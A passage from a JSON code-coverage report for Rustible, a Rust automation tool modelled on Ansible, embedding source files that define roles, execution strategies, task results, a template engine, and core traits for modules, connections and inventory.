"address":[27706336],"length":1,"stats":{"Line":0}},{"line":114,"address":[27706374],"length":1,"stats":{"Line":0}},{"line":115,"address":[27706522],"length":1,"stats":{"Line":0}},{"line":116,"address":[27706491],"length":1,"stats":{"Line":0}},{"line":120,"address":[27706388,27706589],"length":1,"stats":{"Line":0}},{"line":121,"address":[27706681,27706831],"length":1,"stats":{"Line":0}},{"line":122,"address":[28803790,28803941],"length":1,"stats":{"Line":0}},{"line":126,"address":[27706781],"length":1,"stats":{"Line":0}},{"line":130,"address":[27706272],"length":1,"stats":{"Line":0}},{"line":131,"address":[27706277],"length":1,"stats":{"Line":0}},{"line":135,"address":[27706288],"length":1,"stats":{"Line":0}},{"line":136,"address":[27706293],"length":1,"stats":{"Line":0}},{"line":253,"address":[],"length":0,"stats":{"Line":0}},{"line":255,"address":[],"length":0,"stats":{"Line":0}},{"line":256,"address":[],"length":0,"stats":{"Line":0}},{"line":260,"address":[],"length":0,"stats":{"Line":0}},{"line":261,"address":[],"length":0,"stats":{"Line":0}},{"line":262,"address":[],"length":0,"stats":{"Line":0}},{"line":263,"address":[],"length":0,"stats":{"Line":0}},{"line":264,"address":[],"length":0,"stats":{"Line":0}},{"line":265,"address":[],"length":0,"stats":{"Line":0}},{"line":266,"address":[],"length":0,"stats":{"Line":0}},{"line":278,"address":[],"length":0,"stats":{"Line":0}},{"line":279,"address":[],"length":0,"stats":{"Line":0}},{"line":280,"address":[],"length":0,"stats":{"Line":0}},{"line":285,"address":[27704096],"length":1,"stats":{"Line":0}},{"line":286,"address":[27704132],"length":1,"stats":{"Line":0}},{"line":287,"address":[27704242],"length":1,"stats":{"Line":0}},{"line":288,"address":[27704211],"length":1,"stats":{"Line":0}},{"line":293,"address":[27704149,27704309],"length":1,"stats":{"Line":0}},{"line":294,"address":[27704377,27704699],"length":1,"stats":{"Line":0}},{"line":298,"address":[27704451,27704479],"length":1,"stats":{"Line":0}},{"line":299,"address":[27704547],"length":1,"stats":{"Line":0}},{"line":300,"address":[27704620],"length":1,"stats":{"Line":0}},{"line":301,"address":[27704589],"length":1,"stats":{"Line":0}},{"line":306,"address":[27704570],"length":1,"stats":{"Line":0}},{"line":310,"address":[27704768],"length":1,"stats":{"Line":0}},{"line":311,"address":[27704800],"length":1,"stats":{"Line":0}},{"line":313,"address":[27704837],"length":1,"stats":{"Line":0}},{"line":314,"address":[27704890],"length":1,"stats":{"Line":0}},{"line":318,"address":[27703936],"length":1,"stats":{"Line":0}},{"line":319,"address":[27704072,27703950],"length":1,"stats":{"Line":0}},{"line":351,"address":[27706096],"length":1,"stats":{"Line":0}},{"line":352,"address":[27706110,27706198],"length":1,"stats":{"Line":0}},{"line":353,"address":[27706174],"length":1,"stats":{"Line":0}},{"line":354,"address":[27706147],"length":1,"stats":{"Line":0}},{"line":470,"address":[],"length":0,"stats":{"Line":0}},{"line":471,"address":[],"length":0,"stats":{"Line":0}},{"line":480,"address":[],"length":0,"stats":{"Line":0}},{"line":489,"address":[],"length":0,"stats":{"Line":0}},{"line":490,"address":[],"length":0,"stats":{"Line":0}},{"line":491,"address":[],"length":0,"stats":{"Line":0}},{"line":501,"address":[27705024],"length":1,"stats":{"Line":0}},{"line":502,"address":[27705062],"length":1,"stats":{"Line":0}},{"line":503,"address":[27705122],"length":1,"stats":{"Line":0}},{"line":504,"address":[27705091],"length":1,"stats":{"Line":0}},{"line":507,"address":[27705083],"length":1,"stats":{"Line":0}},{"line":511,"address":[27704992],"length":1,"stats":{"Line":0}},{"line":512,"address":[27704997],"length":1,"stats":{"Line":0}},{"line":516,"address":[27704960],"length":1,"stats":{"Line":0}},{"line":517,"address":[27704968],"length":1,"stats":{"Line":0}},{"line":534,"address":[28791978,28791997,28790432],"length":1,"stats":{"Line":1}},{"line":542,"address":[28790457],"length":1,"stats":{"Line":1}},{"line":545,"address":[28790637],"length":1,"stats":{"Line":1}},{"line":546,"address":[],"length":0,"stats":{"Line":0}},{"line":547,"address":[],"length":0,"stats":{"Line":0}},{"line":548,"address":[],"length":0,"stats":{"Line":0}},{"line":549,"address":[],"length":0,"stats":{"Line":0}},{"line":550,"address":[],"length":0,"stats":{"Line":0}},{"line":551,"address":[],"length":0,"stats":{"Line":0}},{"line":552,"address":[],"length":0,"stats":{"Line":0}},{"line":553,"address":[],"length":0,"stats":{"Line":0}},{"line":554,"address":[],"length":0,"stats":{"Line":0}},{"line":555,"address":[],"length":0,"stats":{"Line":0}},{"line":556,"address":[],"length":0,"stats":{"Line":0}},{"line":557,"address":[],"length":0,"stats":{"Line":0}},{"line":558,"address":[],"length":0,"stats":{"Line":0}},{"line":559,"address":[],"length":0,"stats":{"Line":0}},{"line":560,"address":[],"length":0,"stats":{"Line":0}},{"line":561,"address":[],"length":0,"stats":{"Line":0}},{"line":562,"address":[],"length":0,"stats":{"Line":0}},{"line":563,"address":[],"length":0,"stats":{"Line":0}},{"line":564,"address":[],"length":0,"stats":{"Line":0}},{"line":565,"address":[],"length":0,"stats":{"Line":0}},{"line":566,"address":[],"length":0,"stats":{"Line":0}},{"line":567,"address":[],"length":0,"stats":{"Line":0}},{"line":571,"address":[28791383,28791448],"length":1,"stats":{"Line":1}},{"line":573,"address":[28791308,28792016,28792030],"length":1,"stats":{"Line":3}},{"line":575,"address":[28792097,28792096,28791432,28791360],"length":1,"stats":{"Line":1}},{"line":578,"address":[28791702],"length":1,"stats":{"Line":1}},{"line":579,"address":[28791601,28791550],"length":1,"stats":{"Line":2}},{"line":580,"address":[28791624,28791617,28791734,28791956],"length":1,"stats":{"Line":2}},{"line":582,"address":[28791802],"length":1,"stats":{"Line":1}},{"line":583,"address":[28791754],"length":1,"stats":{"Line":1}},{"line":584,"address":[],"length":0,"stats":{"Line":0}},{"line":601,"address":[27705519,27705525,27705200],"length":1,"stats":{"Line":0}},{"line":602,"address":[27705224],"length":1,"stats":{"Line":0}},{"line":603,"address":[27705299],"length":1,"stats":{"Line":0}},{"line":604,"address":[27705238],"length":1,"stats":{"Line":0}},{"line":633,"address":[27703888],"length":1,"stats":{"Line":0}},{"line":634,"address":[27703896],"length":1,"stats":{"Line":0}},{"line":666,"address":[],"length":0,"stats":{"Line":0}},{"line":668,"address":[],"length":0,"stats":{"Line":0}},{"line":670,"address":[],"length":0,"stats":{"Line":0}},{"line":675,"address":[27705632,27706072,27706078],"length":1,"stats":{"Line":0}},{"line":676,"address":[27705896,27705672],"length":1,"stats":{"Line":0}},{"line":677,"address":[27705868,27705960],"length":1,"stats":{"Line":0}},{"line":678,"address":[27706038],"length":1,"stats":{"Line":0}}],"covered":18,"coverable":139},{"path":["/","home","artur","Repositories","rustible","src","roles.rs"],"content":"//! Role definitions for Rustible\n\nuse serde::{Deserialize, Serialize};\nuse std::path::PathBuf;\n\n/// A role containing reusable automation\n#[derive(Debug, Clone, Serialize, Deserialize)]\npub struct Role {\n    /// Role name\n    pub name: String,\n    /// Role path\n    pub path: PathBuf,\n    /// Role metadata\n    #[serde(default)]\n    pub meta: RoleMeta,\n}\n\n/// Role metadata\n#[derive(Debug, Clone, Default, Serialize, Deserialize)]\npub struct RoleMeta {\n    /// Role dependencies\n    #[serde(default)]\n    pub dependencies: Vec\u003cString\u003e,\n    /// Supported platforms\n    #[serde(default)]\n    pub platforms: Vec\u003cString\u003e,\n}\n\nimpl Role {\n    /// Create a new role\n    pub fn new(name: impl Into\u003cString\u003e, path: impl Into\u003cPathBuf\u003e) -\u003e Self {\n        Self {\n            name: name.into(),\n            path: path.into(),\n            meta: RoleMeta::default(),\n        }\n    }\n}\n","traces":[{"line":31,"address":[],"length":0,"stats":{"Line":0}},{"line":33,"address":[],"length":0,"stats":{"Line":0}},{"line":34,"address":[],"length":0,"stats":{"Line":0}},{"line":35,"address":[],"length":0,"stats":{"Line":0}}],"covered":0,"coverable":4},{"path":["/","home","artur","Repositories","rustible","src","strategy.rs"],"content":"//! Execution strategies for Rustible\n\nuse serde::{Deserialize, Serialize};\n\n/// Execution strategy\n#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]\npub enum Strategy {\n    /// Linear - run each task on all hosts before next task\n    Linear,\n    /// Free - each host runs independently as fast as possible\n    Free,\n    /// Host pinned - dedicated worker per host\n    HostPinned,\n}\n\nimpl Default for Strategy {\n    fn default() -\u003e Self {\n        Self::Linear\n    }\n}\n\nimpl std::fmt::Display for Strategy {\n    fn fmt(\u0026self, f: \u0026mut std::fmt::Formatter\u003c'_\u003e) -\u003e std::fmt::Result {\n        match self {\n            Self::Linear =\u003e write!(f, \"linear\"),\n            Self::Free =\u003e write!(f, \"free\"),\n            Self::HostPinned =\u003e write!(f, \"host_pinned\"),\n        }\n    }\n}\n","traces":[{"line":23,"address":[31867472],"length":1,"stats":{"Line":0}},{"line":24,"address":[31867499],"length":1,"stats":{"Line":0}},{"line":25,"address":[31867531],"length":1,"stats":{"Line":0}},{"line":26,"address":[31867571],"length":1,"stats":{"Line":0}},{"line":27,"address":[31867611],"length":1,"stats":{"Line":0}}],"covered":0,"coverable":5},{"path":["/","home","artur","Repositories","rustible","src","tasks.rs"],"content":"//! Task definitions and execution\n\nuse serde::{Deserialize, Serialize};\n\n/// Task execution result\n#[derive(Debug, Clone, Serialize, Deserialize)]\npub struct TaskResult {\n    /// Whether the task changed anything\n    pub changed: bool,\n    /// Whether the task failed\n    pub failed: bool,\n    /// Whether the task was skipped\n    pub skipped: bool,\n    /// Message from the task\n    pub msg: Option\u003cString\u003e,\n}\n\nimpl TaskResult {\n    /// Create a successful result\n    pub fn ok() -\u003e Self {\n        Self {\n            changed: false,\n            failed: false,\n            skipped: false,\n            msg: None,\n        }\n    }\n\n    /// Create a changed result\n    pub fn changed() -\u003e Self {\n        Self {\n            changed: true,\n            failed: false,\n            skipped: false,\n            msg: None,\n        }\n    }\n\n    /// Create a failed result\n    pub fn failed(msg: impl Into\u003cString\u003e) -\u003e Self {\n        Self {\n            changed: false,\n            failed: true,\n            skipped: false,\n            msg: Some(msg.into()),\n        }\n    }\n\n    /// Create a skipped result\n    pub fn skipped(msg: impl Into\u003cString\u003e) -\u003e Self {\n        Self {\n            changed: false,\n            failed: false,\n            skipped: true,\n            msg: Some(msg.into()),\n        }\n    }\n}\n","traces":[{"line":20,"address":[25462480],"length":1,"stats":{"Line":0}},{"line":30,"address":[25462544],"length":1,"stats":{"Line":0}},{"line":40,"address":[],"length":0,"stats":{"Line":0}},{"line":45,"address":[],"length":0,"stats":{"Line":0}},{"line":50,"address":[],"length":0,"stats":{"Line":0}},{"line":55,"address":[],"length":0,"stats":{"Line":0}}],"covered":0,"coverable":6},{"path":["/","home","artur","Repositories","rustible","src","template.rs"],"content":"//! Template engine for Rustible (Jinja2-compatible)\n\nuse crate::error::Result;\nuse minijinja::Environment;\nuse std::collections::HashMap;\n\n/// Template engine using minijinja\npub struct TemplateEngine {\n    env: Environment\u003c'static\u003e,\n}\n\nimpl TemplateEngine {\n    /// Create a new template engine\n    pub fn new() -\u003e Self {\n        let env = Environment::new();\n        Self { env }\n    }\n\n    /// Render a template string\n    pub fn render(\n        \u0026self,\n        template: \u0026str,\n        vars: \u0026HashMap\u003cString, serde_json::Value\u003e,\n    ) -\u003e Result\u003cString\u003e {\n        let tmpl = self.env.template_from_str(template)?;\n        let result = tmpl.render(vars)?;\n        Ok(result)\n    }\n\n    /// Check if a string contains template syntax\n    pub fn is_template(s: \u0026str) -\u003e bool {\n        s.contains(\"{{\") || s.contains(\"{%\")\n    }\n}\n\nimpl Default for TemplateEngine {\n    fn default() -\u003e Self {\n        Self::new()\n    }\n}\n","traces":[{"line":14,"address":[24888080],"length":1,"stats":{"Line":1}},{"line":15,"address":[24888097],"length":1,"stats":{"Line":1}},{"line":20,"address":[24888629,24888144,24888623],"length":1,"stats":{"Line":1}},{"line":25,"address":[24888198],"length":1,"stats":{"Line":1}},{"line":26,"address":[24888412,24888348],"length":1,"stats":{"Line":2}},{"line":27,"address":[24888544],"length":1,"stats":{"Line":1}},{"line":31,"address":[24887984],"length":1,"stats":{"Line":0}},{"line":32,"address":[24888007],"length":1,"stats":{"Line":0}},{"line":36,"address":[46525873,46525712,46525879],"length":1,"stats":{"Line":1}},{"line":37,"address":[24873360],"length":1,"stats":{"Line":1}},{"line":38,"address":[24873368],"length":1,"stats":{"Line":1}}],"covered":9,"coverable":11},{"path":["/","home","artur","Repositories","rustible","src","traits.rs"],"content":"//! Core traits defining the fundamental abstractions in Rustible.\n//!\n//! This module contains the primary trait definitions that form the backbone\n//! of Rustible's architecture. These traits enable extensibility, allowing\n//! users to implement custom modules, connections, and inventory sources.\n\nuse async_trait::async_trait;\nuse serde::{de::DeserializeOwned, Serialize};\nuse std::any::Any;\nuse std::collections::HashMap;\nuse std::fmt::Debug;\nuse std::sync::Arc;\n\nuse crate::error::Result;\nuse crate::facts::Facts;\nuse crate::vars::Variables;\n\n// ============================================================================\n// Module Traits\n// ============================================================================\n\n/// Represents a module that can be executed on a target host.\n///\n/// Modules are the units of work in Rustible. Each module performs a specific\n/// action such as copying files, managing packages, or executing commands.\n///\n/// # Idempotency\n///\n/// Modules should be idempotent whenever possible - running the same module\n/// with the same arguments multiple times should produce the same result.\n///\n/// # Example\n///\n/// ```rust,ignore\n/// use rustible::traits::{Module, ModuleArgs, ExecutionContext};\n/// use rustible::modules::ModuleResult;\n/// use async_trait::async_trait;\n///\n/// #[derive(Debug)]\n/// struct CopyModule;\n///\n/// #[async_trait]\n/// impl Module for CopyModule {\n///     fn name(\u0026self) -\u003e \u0026str {\n///         \"copy\"\n///     }\n///\n///     async fn execute(\n///         \u0026self,\n///         args: \u0026dyn ModuleArgs,\n///         ctx: \u0026ExecutionContext,\n///     ) -\u003e Result\u003cModuleResult\u003e {\n///         // Implementation here\n///         Ok(ModuleResult::changed(\"File copied successfully\"))\n///     }\n/// }\n/// ```\n#[async_trait]\npub trait Module: Send + Sync + Debug {\n    /// Returns the unique name of this module.\n    ///\n    /// This name is used to reference the module in playbooks.\n    fn name(\u0026self) -\u003e \u0026str;\n\n    /// Returns a description of what this module does.\n    fn description(\u0026self) -\u003e \u0026str {\n        \"No description available\"\n    }\n\n    /// Returns the expected arguments schema for this module.\n    ///\n    /// Used for validation and documentation generation.\n    fn args_schema(\u0026self) -\u003e Option\u003c\u0026ModuleSchema\u003e {\n        None\n    }\n\n    /// Validates the provided arguments before execution.\n    ///\n    /// This is called before `execute` to catch configuration errors early.\n    fn validate_args(\u0026self, args: \u0026dyn ModuleArgs) -\u003e Result\u003c()\u003e {\n        let _ = args;\n        Ok(())\n    }\n\n    /// Executes the module with the given arguments and context.\n    ///\n    /// # Arguments\n    ///\n    /// * `args` - The arguments provided to the module\n    /// * `ctx` - The execution context containing connection, facts, and variables\n    ///\n    /// # Returns\n    ///\n    /// A `ModuleResult` indicating success/failure and whether changes were made.\n    async fn execute(\u0026self, args: \u0026dyn ModuleArgs, ctx: \u0026ExecutionContext) -\u003e Result\u003cModuleResult\u003e;\n\n    /// Performs a dry-run of the module (check mode).\n    ///\n    /// Should return what would happen without making actual changes.\n    async fn check(\u0026self, args: \u0026dyn ModuleArgs, ctx: \u0026ExecutionContext) -\u003e Result\u003cModuleResult\u003e {\n        // Default implementation just reports what would be checked\n        let _ = (args, ctx);\n        Ok(ModuleResult::skipped(\n            \"Check mode not implemented for this module\",\n        ))\n    }\n\n    /// Returns the diff between current and desired state.\n    ///\n    /// Used when `--diff` flag is provided.\n    async fn diff(\n        \u0026self,\n        args: \u0026dyn ModuleArgs,\n        ctx: \u0026ExecutionContext,\n    ) -\u003e Result\u003cOption\u003cModuleDiff\u003e\u003e {\n        let _ = (args, ctx);\n        Ok(None)\n    }\n}\n\n/// Arguments passed to a module for execution.\n///\n/// This trait provides a type-erased interface for accessing module arguments.\npub trait ModuleArgs: Send + Sync + Debug {\n    /// Returns the argument value for the given key.\n    fn get(\u0026self, key: \u0026str) -\u003e Option\u003c\u0026serde_json::Value\u003e;\n\n    /// Returns all arguments as a map.\n    fn as_map(\u0026self) -\u003e \u0026HashMap\u003cString, serde_json::Value\u003e;\n\n    /// Returns all arguments as a JSON value.\n    fn as_json(\u0026self) -\u003e serde_json::Value;\n\n    /// Returns this as Any for downcasting.\n    fn as_any(\u0026self) -\u003e \u0026dyn Any;\n}\n\n/// Helper function to deserialize module args to a concrete type.\npub fn deserialize_args\u003cT: DeserializeOwned\u003e(args: \u0026dyn ModuleArgs) -\u003e Result\u003cT\u003e {\n    let json = args.as_json();\n    serde_json::from_value(json).map_err(|e| crate::error::Error::ModuleArgs {\n        module: \"unknown\".to_string(),\n        message: e.to_string(),\n    })\n}\n\n/// Schema definition for module arguments.\n#[derive(Debug, Clone)]\npub struct ModuleSchema {\n    /// Required arguments\n    pub required: Vec\u003cArgSpec\u003e,\n    /// Optional arguments\n    pub optional: Vec\u003cArgSpec\u003e,\n    /// Whether additional arguments are allowed\n    pub additional_properties: bool,\n}\n\n/// Specification for a single argument.\n#[derive(Debug, Clone)]\npub struct ArgSpec {\n    /// Argument name\n    pub name: String,\n    /// Argument type\n    pub arg_type: ArgType,\n    /// Description of the argument\n    pub description: String,\n    /// Default value if not provided\n    pub default: Option\u003cserde_json::Value\u003e,\n    /// Valid choices for this argument\n    pub choices: Option\u003cVec\u003cserde_json::Value\u003e\u003e,\n}\n\n/// Types of arguments a module can accept.\n#[derive(Debug, Clone, PartialEq, Eq)]\npub enum ArgType {\n    /// String value\n    String,\n    /// Integer value\n    Integer,\n    /// Boolean value\n    Boolean,\n    /// List of values\n    List,\n    /// Dictionary/map\n    Dict,\n    /// File path\n    Path,\n    /// Any type\n    Any,\n}\n\n/// Result of a module execution.\n#[derive(Debug, Clone, Serialize)]\npub struct ModuleResult {\n    /// Whether the module execution was successful\n    pub success: bool,\n    /// Whether the module made changes to the target\n    pub changed: bool,\n    /// Human-readable message about the result\n    pub message: String,\n    /// Whether the task was skipped\n    pub skipped: bool,\n    /// Additional output data from the module\n    #[serde(skip_serializing_if = \"Option::is_none\")]\n    pub data: Option\u003cserde_json::Value\u003e,\n    /// Warnings generated during execution\n    #[serde(skip_serializing_if = \"Vec::is_empty\")]\n    pub warnings: Vec\u003cString\u003e,\n}\n\nimpl ModuleResult {\n    /// Creates a successful result indicating no changes were made.\n    pub fn ok(message: impl Into\u003cString\u003e) -\u003e Self {\n        Self {\n            success: true,\n            changed: false,\n            message: message.into(),\n            skipped: false,\n            data: None,\n            warnings: Vec::new(),\n        }\n    }\n\n    /// Creates a successful result indicating changes were made.\n    pub fn changed(message: impl Into\u003cString\u003e) -\u003e Self {\n        Self {\n            success: true,\n            changed: true,\n            message: message.into(),\n            skipped: false,\n            data: None,\n            warnings: Vec::new(),\n        }\n    }\n\n    /// Creates a failed result.\n    pub fn failed(message: impl Into\u003cString\u003e) -\u003e Self {\n        Self {\n            success: false,\n            changed: false,\n            message: message.into(),\n            skipped: false,\n            data: None,\n            warnings: Vec::new(),\n        }\n    }\n\n    /// Creates a skipped result.\n    pub fn skipped(message: impl Into\u003cString\u003e) -\u003e Self {\n        Self {\n            success: true,\n            changed: false,\n            message: message.into(),\n            skipped: true,\n            data: None,\n            warnings: Vec::new(),\n        }\n    }\n\n    /// Attaches additional data to the result.\n    pub fn with_data(mut self, data: serde_json::Value) -\u003e Self {\n        self.data = Some(data);\n        self\n    }\n\n    /// Adds a warning to the result.\n    pub fn with_warning(mut self, warning: impl Into\u003cString\u003e) -\u003e Self {\n        self.warnings.push(warning.into());\n        self\n    }\n}\n\n/// Represents a diff between current and desired state.\n#[derive(Debug, Clone)]\npub struct ModuleDiff {\n    /// Description of what will change\n    pub description: String,\n    /// Before state (if available)\n    pub before: Option\u003cString\u003e,\n    /// After state (if available)\n    pub after: Option\u003cString\u003e,\n}\n\n// ============================================================================\n// Connection Traits\n// ============================================================================\n\n/// Represents a connection to a target host.\n///\n/// Connections handle the transport layer for executing commands and\n/// transferring files to remote (or local) systems.\n///\n/// # Implementations\n///\n/// - `SshConnection` - SSH-based remote connections\n/// - `LocalConnection` - Local system execution\n/// - `DockerConnection` - Docker container connections\n/// - `KubernetesConnection` - Kubernetes pod connections\n#[async_trait]\npub trait Connection: Send + Sync + Debug {\n    /// Returns the connection type name (e.g., \"ssh\", \"local\", \"docker\").\n    fn connection_type(\u0026self) -\u003e \u0026str;\n\n    /// Returns the target host identifier.\n    fn target(\u0026self) -\u003e \u0026str;\n\n    /// Checks if the connection is currently active.\n    fn is_connected(\u0026self) -\u003e bool;\n\n    /// Establishes the connection to the target.\n    async fn connect(\u0026mut self) -\u003e Result\u003c()\u003e;\n\n    /// Closes the connection gracefully.\n    async fn disconnect(\u0026mut self) -\u003e Result\u003c()\u003e;\n\n    /// Executes a command on the target and returns the output.\n    ///\n    /// # Arguments\n    ///\n    /// * `command` - The command to execute\n    /// * `options` - Execution options (timeout, environment, etc.)\n    ///\n    /// # Returns\n    ///\n    /// A `CommandResult` containing stdout, stderr, and exit code.\n    async fn execute_command(\n        \u0026self,\n        command: \u0026str,\n        options: \u0026CommandOptions,\n    ) -\u003e Result\u003cCommandResult\u003e;\n\n    /// Copies a file to the target host.\n    ///\n    /// # Arguments\n    ///\n    /// * `local_path` - Path to the local file\n    /// * `remote_path` - Destination path on the target\n    /// * `options` - Transfer options (permissions, owner, etc.)\n    async fn put_file(\n        \u0026self,\n        local_path: \u0026std::path::Path,\n        remote_path: \u0026std::path::Path,\n        options: \u0026FileTransferOptions,\n    ) -\u003e Result\u003c()\u003e;\n\n    /// Retrieves a file from the target host.\n    ///\n    /// # Arguments\n    ///\n    /// * `remote_path` - Path to the file on the target\n    /// * `local_path` - Destination path on the local system\n    async fn get_file(\n        \u0026self,\n        remote_path: \u0026std::path::Path,\n        local_path: \u0026std::path::Path,\n    ) -\u003e Result\u003c()\u003e;\n\n    /// Writes content directly to a file on the target.\n    async fn put_content(\n        \u0026self,\n        content: \u0026[u8],\n        remote_path: \u0026std::path::Path,\n        options: \u0026FileTransferOptions,\n    ) -\u003e Result\u003c()\u003e;\n\n    /// Reads content directly from a file on the target.\n    async fn get_content(\u0026self, remote_path: \u0026std::path::Path) -\u003e Result\u003cVec\u003cu8\u003e\u003e;\n\n    /// Checks if a path exists on the target.\n    async fn path_exists(\u0026self, path: \u0026std::path::Path) -\u003e Result\u003cbool\u003e;\n\n    /// Gets file metadata from the target.\n    async fn stat(\u0026self, path: \u0026std::path::Path) -\u003e Result\u003cFileStat\u003e;\n\n    /// Becomes another user (privilege escalation).\n    ///\n    /// # Arguments\n    ///\n    /// * `become_config` - Configuration for privilege escalation\n    async fn become_user(\u0026mut self, become_config: \u0026BecomeConfig) -\u003e Result\u003c()\u003e;\n}\n\n/// Options for command execution.\n#[derive(Debug, Clone, Default)]\npub struct CommandOptions {\n    /// Working directory for the command\n    pub cwd: Option\u003cstd::path::PathBuf\u003e,\n    /// Environment variables to set\n    pub env: HashMap\u003cString, String\u003e,\n    /// Timeout in seconds\n    pub timeout: Option\u003cu64\u003e,\n    /// Whether to use a pseudo-TTY\n    pub use_pty: bool,\n    /// Stdin input to provide\n    pub stdin: Option\u003cString\u003e,\n}\n\n/// Result of command execution.\n#[derive(Debug, Clone)]\npub struct CommandResult {\n    /// Standard output\n    pub stdout: String,\n    /// Standard error\n    pub stderr: String,\n    /// Exit code (None if process was killed)\n    pub exit_code: Option\u003ci32\u003e,\n}\n\nimpl CommandResult {\n    /// Returns true if the command succeeded (exit code 0).\n    pub fn success(\u0026self) -\u003e bool {\n        self.exit_code == Some(0)\n    }\n\n    /// Returns the combined stdout and stderr.\n    pub fn output(\u0026self) -\u003e String {\n        if self.stderr.is_empty() {\n            self.stdout.clone()\n        } else if self.stdout.is_empty() {\n            self.stderr.clone()\n        } else {\n            format!(\"{}\\n{}\", self.stdout, self.stderr)\n        }\n    }\n}\n\n/// Options for file transfers.\n#[derive(Debug, Clone, Default)]\npub struct FileTransferOptions {\n    /// File mode/permissions (e.g., 0o644)\n    pub mode: Option\u003cu32\u003e,\n    /// Owner user\n    pub owner: Option\u003cString\u003e,\n    /// Owner group\n    pub group: Option\u003cString\u003e,\n    /// Whether to create parent directories\n    pub create_parents: bool,\n    /// Whether to backup existing file\n    pub backup: bool,\n}\n\n/// File metadata from target system.\n#[derive(Debug, Clone)]\npub struct FileStat {\n    /// File mode/permissions\n    pub mode: u32,\n    /// Owner user ID\n    pub uid: u32,\n    /// Owner group ID\n    pub gid: u32,\n    /// File size in bytes\n    pub size: u64,\n    /// Modification time (Unix timestamp)\n    pub mtime: i64,\n    /// Whether this is a directory\n    pub is_dir: bool,\n    /// Whether this is a symlink\n    pub is_symlink: bool,\n}\n\n/// Configuration for privilege escalation (become).\n#[derive(Debug, Clone, Default)]\npub struct BecomeConfig {\n    /// Whether to use privilege escalation\n    pub enabled: bool,\n    /// Method to use (sudo, su, doas, etc.)\n    pub method: String,\n    /// User to become\n    pub user: String,\n    /// Password for escalation (if required)\n    pub password: Option\u003cString\u003e,\n    /// Additional flags for the become method\n    pub flags: Option\u003cString\u003e,\n}\n\n// ============================================================================\n// Inventory Traits\n// ============================================================================\n\n/// Source for loading inventory data.\n///\n/// Inventory sources provide hosts and groups for playbook execution.\n/// Multiple sources can be combined into a single inventory.\n#[async_trait]\npub trait InventorySource: Send + Sync + Debug {\n    /// Returns the name of this inventory source.\n    fn name(\u0026self) -\u003e \u0026str;\n\n    /// Loads the inventory from this source.\n    async fn load(\u0026self) -\u003e Result\u003cInventoryData\u003e;\n\n    /// Refreshes the inventory (for dynamic sources).\n    async fn refresh(\u0026self) -\u003e Result\u003cInventoryData\u003e {\n        self.load().await\n    }\n}\n\n/// Raw inventory data loaded from a source.\n#[derive(Debug, Clone, Default)]\npub struct InventoryData {\n    /// Hosts in this inventory\n    pub hosts: HashMap\u003cString, HostData\u003e,\n    /// Groups and their members\n    pub groups: HashMap\u003cString, GroupData\u003e,\n    /// Global variables\n    pub vars: Variables,\n}\n\n/// Host data from inventory.\n#[derive(Debug, Clone, Default)]\npub struct HostData {\n    /// Hostname or address\n    pub name: String,\n    /// Host-specific variables\n    pub vars: Variables,\n    /// Groups this host belongs to\n    pub groups: Vec\u003cString\u003e,\n}\n\n/// Group data from inventory.\n#[derive(Debug, Clone, Default)]\npub struct GroupData {\n    /// Group name\n    pub name: String,\n    /// Hosts in this group\n    pub hosts: Vec\u003cString\u003e,\n    /// Child groups\n    pub children: Vec\u003cString\u003e,\n    /// Group-specific variables\n    pub vars: Variables,\n}\n\n// ============================================================================\n// Task Traits\n// ============================================================================\n\n/// Represents a task that can be executed.\n///\n/// Tasks are the basic units of execution in a playbook. Each task\n/// typically invokes a module with specific arguments.\n#[async_trait]\npub trait Executable: Send + Sync + Debug {\n    /// Returns the name of this executable.\n    fn name(\u0026self) -\u003e \u0026str;\n\n    /// Executes this task with the given context.\n    async fn execute(\u0026self, ctx: \u0026ExecutionContext) -\u003e Result\u003cExecutionResult\u003e;\n\n    /// Checks if this task should be skipped based on conditions.\n    fn should_skip(\u0026self, ctx: \u0026ExecutionContext) -\u003e Result\u003cbool\u003e {\n        let _ = ctx;\n        Ok(false)\n    }\n}\n\n/// Context provided during task execution.\n#[derive(Debug)]\npub struct ExecutionContext {\n    /// The connection to the target host\n    pub connection: Arc\u003cdyn Connection\u003e,\n    /// Facts gathered from the host\n    pub facts: Facts,\n    /// Variables available during execution\n    pub variables: Variables,\n    /// Whether we're in check mode (dry run)\n    pub check_mode: bool,\n    /// Whether to show diffs\n    pub diff_mode: bool,\n    /// Verbosity level\n    pub verbosity: u8,\n}\n\n/// Result of task execution.\n#[derive(Debug, Clone)]\npub struct ExecutionResult {\n    /// The host this was executed on\n    pub host: String,\n    /// Name of the task\n    pub task_name: String,\n    /// The module result\n    pub result: ModuleResult,\n    /// Duration of execution\n    pub duration: std::time::Duration,\n    /// Handlers to notify\n    pub notify: Vec\u003cString\u003e,\n}\n\n// ============================================================================\n// Strategy Traits\n// ============================================================================\n\n/// Execution strategy for running tasks across hosts.\n///\n/// Strategies control how tasks are distributed and executed across\n/// the target hosts in a play.\n#[async_trait]\npub trait ExecutionStrategy: Send + Sync + Debug {\n    /// Returns the name of this strategy.\n    fn name(\u0026self) -\u003e \u0026str;\n\n    /// Executes tasks according to this strategy.\n    ///\n    /// # Arguments\n    ///\n    /// * `tasks` - The tasks to execute\n    /// * `hosts` - The target hosts\n    /// * `ctx_factory` - Factory for creating execution contexts\n    async fn execute\u003cF\u003e(\n        \u0026self,\n        tasks: \u0026[Arc\u003cdyn Executable\u003e],\n        hosts: \u0026[String],\n        ctx_factory: F,\n    ) -\u003e Result\u003cVec\u003cExecutionResult\u003e\u003e\n    where\n        F: Fn(\u0026str) -\u003e ExecutionContext + Send + Sync;\n}\n\n// ============================================================================\n// Callback Traits\n// ============================================================================\n\n/// Callback for receiving execution events.\n///\n/// Callbacks allow customizing the output and handling of execution\n/// events such as task start, completion, and failure.\n#[async_trait]\npub trait ExecutionCallback: Send + Sync {\n    /// Called when a playbook starts.\n    async fn on_playbook_start(\u0026self, name: \u0026str) {\n        let _ = name;\n    }\n\n    /// Called when a playbook ends.\n    async fn on_playbook_end(\u0026self, name: \u0026str, success: bool) {\n        let _ = (name, success);\n    }\n\n    /// Called when a play starts.\n    async fn on_play_start(\u0026self, name: \u0026str, hosts: \u0026[String]) {\n        let _ = (name, hosts);\n    }\n\n    /// Called when a play ends.\n    async fn on_play_end(\u0026self, name: \u0026str, success: bool) {\n        let _ = (name, success);\n    }\n\n    /// Called when a task starts.\n    async fn on_task_start(\u0026self, name: \u0026str, host: \u0026str) {\n        let _ = (name, host);\n    }\n\n    /// Called when a task completes.\n    async fn on_task_complete(\u0026self, result: \u0026ExecutionResult) {\n        let _ = result;\n    }\n\n    /// Called when a 